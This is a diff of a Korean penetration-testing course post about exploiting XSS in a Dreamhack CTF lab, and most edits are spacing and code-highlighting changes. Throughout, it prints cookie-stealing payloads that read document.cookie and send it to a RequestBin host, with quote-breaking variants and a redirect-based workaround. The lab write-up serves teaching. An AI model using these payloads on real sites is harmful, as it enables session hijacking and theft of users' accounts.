@@ -9,9 +9,9 @@ categories: 모의 해킹
 
 #### XSS 취약점의 활용(Exploitation)
 
-9주차에 XSS 취약점을 탐지하는 방법에 대해서 학습하였고, 해당 취약점의 존재를 입증하기 위한 PoC 코드로 `alert(1);`를 활용하였다. 그런데 실제로 XSS 취약점을 활용하여 수행할 수 있는 공격에는 어떤 것들이 있을까?
+9주 차에 XSS 취약점을 탐지하는 방법에 대해서 학습하였고, 해당 취약점의 존재를 입증하기 위한 PoC 코드로 `alert(1);`를 활용하였다. 그런데 실제로 XSS 취약점을 활용하여 수행할 수 있는 공격에는 어떤 것들이 있을까?
 
-대표적인 공격 중 하나로 쿠키 정보를 탈취하여 세션 ID를 확보하는 방식이 있다. 다음의 예시 스크립트를 살펴 보자.
+대표적인 공격 중 하나로 쿠키 정보를 탈취하여 세션 ID를 확보하는 방식이 있다. 다음의 예시 스크립트를 살펴보자.
 
 ```js
 var cookieData = document.cookie;
@@ -49,35 +49,34 @@ XSS 취약점에 `alert(1);` 대신 위와 같은 스크립트를 삽입하면 �
 
 > <strong>DOM(Document Object Model)</strong>
 >
-> **DOM**은 HTML 문서를 계층적 트리 구조로 표현한 객체 기반의 인터페이스이다. 이 모델은 웹 브라우저가 문서 구조를 이해하고, JavaScript를 통해 문서의 구조·내용 등을 동적으로 조작할 수 있도록 지원한다.
+>**DOM**은 HTML 문서를 계층적 트리 구조로 표현한 객체 기반의 인터페이스이다. 이 모델은 웹 브라우저가 문서 구조를 이해하고, JavaScript를 통해 문서의 구조·내용 등을 동적으로 조작할 수 있도록 지원한다.
 >
 > 다음은 간단한 HTML 문서와 그에 해당하는 DOM 트리의 예시이다.
 >
-> <pre class="dom-html"><code class="language-html hljs language-xml" data-highlighted="yes"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
-> <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
->   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
->     <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
->   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
->   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
->     <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>header<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
->     <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>paragraph<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
->   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
-> <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
-> </code></pre>
->
-> <pre class="dom-tree"><code class="language-c hljs" data-highlighted="yes">document
-> └── html
->     ├── head
->     │   └── title
->     │       └── <span class="hljs-string">"DOM"</span>
->     └── body
->         ├── h1
->         │   └── <span class="hljs-string">"header"</span>
->         └── p
->             └── <span class="hljs-string">"paragraph"</span>
-> </code></pre>
+> <pre class="dom-html"><code class="language-html hljs" data-highlighted="yes"><data class="code-line" value="1"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
+> </data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+> </data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+> </data><data class="code-line" value="4" style="--indent: 4ch;">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+> </data><data class="code-line" value="5" style="--indent: 2ch;">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+> </data><data class="code-line" value="6" style="--indent: 2ch;">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+> </data><data class="code-line" value="7" style="--indent: 4ch;">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>header<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+> </data><data class="code-line" value="8" style="--indent: 4ch;">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>paragraph<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+> </data><data class="code-line" value="9" style="--indent: 2ch;">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+> </data><data class="code-line" value="10"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;
+> </data></code></pre>
+> <pre class="dom-tree"><code class="language-text hljs" data-highlighted="yes"><data class="code-line" value="1">document
+> </data><data class="code-line" value="2">└── html
+> </data><data class="code-line" value="3" style="--indent: 4ch;">    ├── head
+> </data><data class="code-line" value="4" style="--indent: 4ch;">    │   └── title
+> </data><data class="code-line" value="5" style="--indent: 4ch;">    │       └── <span class="hljs-string">"DOM"</span>
+> </data><data class="code-line" value="6" style="--indent: 4ch;">    └── body
+> </data><data class="code-line" value="7" style="--indent: 8ch;">        ├── h1
+> </data><data class="code-line" value="8" style="--indent: 8ch;">        │   └── <span class="hljs-string">"header"</span>
+> </data><data class="code-line" value="9" style="--indent: 8ch;">        └── p
+> </data><data class="code-line" value="10" style="--indent: 12ch;">            └── <span class="hljs-string">"paragraph"</span>
+> </data></code></pre>
 
-실제 웹 사이트에서의 예시를 통해 DOM-Based XSS의 동작 방식을 자세히 살펴 보자.
+실제 웹 사이트에서의 예시를 통해 DOM-Based XSS의 동작 방식을 자세히 살펴보자.
 
 ![DOM-Based XSS](/data/Penetration%20Testing%20%7C%20Week%2010/1.png)
 
@@ -117,7 +116,7 @@ HTML 인코딩은 간단하고 효과적인 XSS 방어 기법이지만, 상황�
 
 ![XSS CTF](/data/Penetration%20Testing%20%7C%20Week%2010/5.png)
 
-9주차에 XSS 취약점을 탐색했던 CTF 환경에서 쿠키 탈취 기법을 실습해 보자.
+9주 차에 XSS 취약점을 탐색했던 CTF 환경에서 쿠키 탈취 기법을 실습해 보자.
 
 <br>
 
@@ -131,13 +130,12 @@ HTML 인코딩은 간단하고 효과적인 XSS 방어 기법이지만, 상황�
 
 글 제목에 입력한 페이로드는 다음과 같다.
 
-```html
-<script>
-  var cookieData = document.cookie;
-  var img = new Image();
-  img.src = "https://zgcsqwt.request.dreamhack.games/?cookie=" + cookieData;
-</script>
-```
+<pre><code class="language-js hljs" data-highlighted="yes"><data class="code-line" value="1"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
+</data><data class="code-line" value="2" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
+</data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
+</data><data class="code-line" value="4" style="--indent: 2ch;">  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
+</data><data class="code-line" value="5"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;
+</data></code></pre>
 
 앞서 살펴본 쿠키 탈취 스크립트와 동일한 형태이다. `img.src`에 지정된 URL은 수신된 HTTP 요청의 내용을 확인할 수 있도록 설정된 **RequestBin** 서비스의 **엔드포인트**이며, 해당 경로로 전송된 요청은 요청 시점의 사용자 쿠키 정보를 포함하게 된다.
 
@@ -177,12 +175,12 @@ HTML 인코딩은 간단하고 효과적인 XSS 방어 기법이지만, 상황�
 
 입력한 페이로드는 다음과 같다.
 
-<pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-string">'</span>);
-<span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
-<span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
-(<span class="hljs-string">'</span>
-</code></pre>
+<pre><code class="language-js hljs" data-highlighted="yes"><data class="code-line" value="1"><span class="hljs-string">'</span>);
+</data><data class="code-line" value="2"><span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
+</data><data class="code-line" value="3"><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
+</data><data class="code-line" value="4">img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
+</data><data class="code-line" value="5">(<span class="hljs-string">'</span>
+</data></code></pre>
 
 검색을 수행한 후 `<script>` 태그 내에 정상적으로 악성 스크립트가 포함된 것을 확인하였다.
 
@@ -214,20 +212,20 @@ img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://
 
 입력한 페이로드는 다음과 같다.
 
-<pre><code class="language-html hljs language-xml" data-highlighted="yes"><span class="hljs-string">"</span>/&gt;
-<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
-  <span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
-  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
-</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-&lt;
-</code></pre>
+<pre><code class="language-js hljs" data-highlighted="yes"><data class="code-line" value="1"><span class="hljs-string">"</span>/&gt;
+</data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
+</data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
+</data><data class="code-line" value="4" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
+</data><data class="code-line" value="5" style="--indent: 2ch;">  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
+</data><data class="code-line" value="6"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</data><data class="code-line" value="7">&lt;
+</data></code></pre>
 
 `user` 파라미터를 변경한 후 `<script>` 태그의 내용을 확인해 보았다.
 
 ![XSS 3](/data/Penetration%20Testing%20%7C%20Week%2010/20.png)
 
-서버 응답을 살펴 보니 `+`가 URL 인코딩된 공백 문자로 처리되어, `<script>` 태그 내에서 공백 문자로 디코딩되어 출력된 것을 확인할 수 있었다. 따라서 `+`를 올바르게 인식시키기 위해 `+`의 URL 인코딩 결과인 `%2B`를 대신 사용하여 요청을 다시 전송하였다.
+서버 응답을 살펴보니 `+`가 URL 인코딩된 공백 문자로 처리되어, `<script>` 태그 내에서 공백 문자로 디코딩되어 출력된 것을 확인할 수 있었다. 따라서 `+`를 올바르게 인식시키기 위해 `+`의 URL 인코딩 결과인 `%2B`를 대신 사용하여 요청을 다시 전송하였다.
 
 ![XSS 3](/data/Penetration%20Testing%20%7C%20Week%2010/21.png)
 
@@ -303,28 +301,28 @@ img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://
 
 입력한 페이로드는 다음과 같다.
 
-<pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-string">'</span>);
-<span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
-<span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
-(<span class="hljs-string">'</span>
-</code></pre>
+<pre><code class="language-js hljs" data-highlighted="yes"><data class="code-line" value="1"><span class="hljs-string">'</span>);
+</data><data class="code-line" value="2"><span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
+</data><data class="code-line" value="3"><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
+</data><data class="code-line" value="4">img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
+</data><data class="code-line" value="5">(<span class="hljs-string">'</span>
+</data></code></pre>
 
 로그인 시도 후 `<script>` 태그의 내용에 정상적으로 악성 스크립트가 포함된 것을 확인하였다.
 
 ![XSS 6](/data/Penetration%20Testing%20%7C%20Week%2010/36.png)
 
-이때 한 가지 문제에 직면했는데, RequestBin 측에 HTTP 요청이 정상적으로 수신되지 않는 현상이 발생했기 때문이었다. 그 이유를 파악하기 위해 다양한 자료를 조사해본 결과, 해당 문제가 두 번째 `<script>` 태그에 포함된 리다이렉션 코드에 기인하는 것으로 확인되었다.
+이때 한 가지 문제에 직면했는데, RequestBin 측에 HTTP 요청이 정상적으로 수신되지 않는 현상이 발생했기 때문이었다. 그 이유를 파악하기 위해 다양한 자료를 조사해 본 결과, 해당 문제가 두 번째 `<script>` 태그에 포함된 리다이렉션 코드에 기인하는 것으로 확인되었다.
 
 일반적으로 웹 브라우저에서 JavaScript를 통해 HTTP 요청을 전송할 경우 그 처리는 **비동기적**으로 이루어진다. 다시 말해, 네트워크 요청이 실제로 이루어지기 전에 뒤따르는 스크립트가 중단 없이 계속해서 실행(정확히는 JavaScript가 모두 실행된 이후에 요청이 전송됨)되는 것이다. 그러나 JavaScript 실행 중 리다이렉션 명령이 호출됨으로써, 네트워크 요청이 전송되기 이전에 클라이언트 측에서 다른 페이지로의 전환이 발생하였다. 이로 인해 원래 의도된 HTTP 요청이 중단되었고, 결과적으로 RequestBin에서는 해당 요청을 수신하지 못하게 된 것이다.
 
 이 문제를 해결하기 위해 페이로드를 다음과 같이 수정하였다.
 
-<pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-string">'</span>);
-<span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
-<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
-(<span class="hljs-string">'</span>
-</code></pre>
+<pre><code class="language-js hljs" data-highlighted="yes"><data class="code-line" value="1"><span class="hljs-string">'</span>);
+</data><data class="code-line" value="2"><span class="hljs-keyword">var</span> cookieData = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
+</data><data class="code-line" value="3"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">"https://zgcsqwt.request.dreamhack.games/?cookie="</span> + cookieData;
+</data><data class="code-line" value="4">(<span class="hljs-string">'</span>
+</data></code></pre>
 
 `login.html`로의 리다이렉션 코드는 수정할 수 없으므로, 해당 스크립트보다 상위에 RequestBin 엔드포인트로의 리다이렉션 코드를 삽입하여 뒤의 코드를 무효화하는 방법을 선택하였다.
 
